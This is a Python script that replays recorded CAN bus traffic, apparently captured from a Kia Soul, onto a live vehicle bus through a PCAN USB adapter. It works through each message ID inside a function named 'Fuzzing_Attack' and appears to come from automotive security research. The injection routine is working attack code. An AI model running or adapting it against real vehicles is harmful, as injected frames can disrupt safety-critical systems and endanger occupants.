#import libraries
import pandas as pd
import numpy as np
import time
from PCANBasic import *
from rich.console import Console
import keyboard

cols = ["No", "Time_Offset", "Type", "ID", "Data_Length", 'One', 'Two', 'Three', 'Four', 'Five', 'Six', 'Seven', 'Eight']

#importing dataset
def Convert_to_Dataframe(path):
    test = pd.read_csv(path, encoding='cp949', index_col=0)
    b = []
    for i in test.index:
        temp = i.split(" ")
        b.append(list(filter(('').__ne__, temp)))
    #final = pd.DataFrame(b, columns = ["No", "Time_Offset", "Type", "ID", "Data_Length", 'One', 'Two', 'Three', 'Four', 'Five', 'Six', 'Seven', 'Eight'])
    final = pd.DataFrame(b, columns = cols)
    return final

def Fuzzing_Attack(id, leng, data):
    all_datas = ""
    time_offset = 0.001
    Fuzzing_attack = TPCANMsg()
    Fuzzing_attack.ID = int(id,16)
    Fuzzing_attack.LEN = leng
    Fuzzing_attack.MSGTYPE = PCAN_MESSAGE_STANDARD
    all_datas += str(hex(Fuzzing_attack.ID)) + "\t" + str(Fuzzing_attack.MSGTYPE) + "\t" + str(hex(Fuzzing_attack.LEN)) 

    for i in range(leng):
        Fuzzing_attack.DATA[i] = int(data[i*2:i*2+2],16)
        all_datas += "\t" + str(hex(Fuzzing_attack.DATA[i]))

    all_datas += "\n"
    res = CAN.Write(CAN_BUS, Fuzzing_attack)
    if res != PCAN_ERROR_OK:
        print("Oh nooo")
        result = CAN.GetErrorText(res)
        print(result)
        exit()
        
    # print(all_datas)
    time.sleep(time_offset)



def find_IDs(data_frame):
    temp1 = data_frame["ID"]
    return list(dict.fromkeys(temp1))
    
def writer(ID, dataset):
    data_field  = []
    temp_d = dataset[dataset["ID"] == ID]    
    for i in range(len(temp_d)):
        temp = ""
        l = int(list(temp_d[cols[4]])[i]) + 5
        for k in range(5, l):
            temp += list(temp_d[cols[k]])[i]
        data_field.append(temp)
        Fuzzing_Attack(ID,(l-5), temp)
        try:    
            if keyboard.is_pressed('q'):  # if key 'q' is pressed 
                print('You Pressed A Key!')
                break  # finishing the loop
        except:
            print("some error happened")
            break  # if user pressed a key other than the given key the loop will break

        #ffile.write(temp)

    return data_field

if __name__ == "__main__":
        
    CAN = PCANBasic()                            #CAN 생성자 
    CAN_BUS = PCAN_USBBUS1
    CAN.Initialize(CAN_BUS, PCAN_BAUD_500K, 2047, 0, 0) #Channel, Btr, HwType, IOPort, INterrupt
    
    dataset_path = "W:\\New_ERA\\CAN_message_tool\\Dataset\\"
    mcan = Convert_to_Dataframe(dataset_path + "2022.08.12 구쏘울 C-CAN (정상).trc")[17:]
    #genisis_bcan = Convert_to_Dataframe("제네시스 B-CAN 후방초음파 3단계.trc")[17:]
    gnID = find_IDs(mcan)
    the_path = dataset_path + "M-CAN\\"
    console = Console()

    with console.status("[bold green]Injecting Datas...") as status: 
        for i in gnID:
            console.log(f"injection of ID({i}) has started")
            # path = the_path + i + ".txt"
            # f = open(path, "x")
            test = writer(i,mcan)
            
            # path = the_path + i + "-1.txt"
            # f1 = open(path, "x")
            
            # for j in range(len(test)):

            #     f.write(test[j])
            #     f.write("\n")
            
            # test1 = list(dict.fromkeys(test))
            # for j in range(0, len(test1)):
            #     f1.write(test1[j])
            #     f1.write("\n")
            console.log(f"injection of ID: {i} has complete")
            console.log(f"Preparing for next ID")
            time.sleep(1)
            # f.close()
            # f1.close() 
